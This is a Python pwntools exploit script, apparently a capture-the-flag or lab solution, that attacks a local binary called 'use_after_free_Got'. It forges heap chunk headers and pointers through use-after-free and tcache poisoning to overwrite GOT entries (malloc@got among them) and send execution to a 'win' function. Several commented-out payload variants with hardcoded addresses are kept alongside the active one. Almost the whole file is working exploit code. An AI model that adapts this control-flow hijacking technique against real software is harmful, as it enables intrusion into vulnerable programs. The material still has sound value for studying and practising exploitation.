# from pwn import *

# payload = b'A'*24 + b'\x21' + b'\x00'*7 + b'\x25\x44\x40'

# p = process(['./use_after_free_Got', payload])

# # Only send if the binary expects input
# # p.send(payload)  # or p.sendline(payload)

# # Optional: interact or receive output
# p.interactive()


from pwn import *

context.binary = './use_after_free_Got'

########## Using malloc to overwrite GOT entry ##########

# payload1 = b'A'*28 + b'\x21' + b'\x00'*3 + b'\x74' + b'\x32' + b'\x05' + b'\x08'
#  b'\x0c\x32\x04\x08' 
payload1 = b'A'*28 + b'\x21' + b'\x00'*3 + b'\x1c' + b'\x32' + b'\x04' + b'\x08'

payload2 = b'\xc6' + b'\x91' + b'\x04' + b'\x08'


DEBUG = False  # ‚Üê toggle this as needed

if DEBUG:
    p = gdb.debug(context.binary.path, gdbscript='''
        b main
        continue
    ''')
else:
    p = process(context.binary.path)
    
# 0x804321d

p.sendline(payload1)
p.sendline(payload2)
p.interactive()




######### Using free to overwrite GOT entry #########

# payload1 = b'A'*28 + b'\x21' + b'\x00'*3 + b'\x28\xb2\x04\x08' 
# payload2 = b'\xb6' + b'\x91' + b'\x04' + b'\x08'




# from pwn import *

# context.binary = './use_after_free_Got'
# elf = context.binary

# # Address of win() and malloc@got
# win = elf.symbols['win']      # You can print(elf.symbols) to see
# malloc_got = elf.got['malloc']

# log.info(f"win address: {hex(win)}")
# log.info(f"malloc@got:  {hex(malloc_got)}")

# # Build payload to poison tcache and set FD to malloc@got
# payload1 = b'A'*24 + b'\x21' + b'\x00'*7 + p64(malloc_got)

# # Build payload to overwrite malloc@got with win()
# payload2 = p64(win)

# # Run with GDB
# p = gdb.debug(elf.path, '''
#     break main
#     continue
# ''')

# p.sendline(payload1)
# p.sendline(payload2)

# p.interactive()
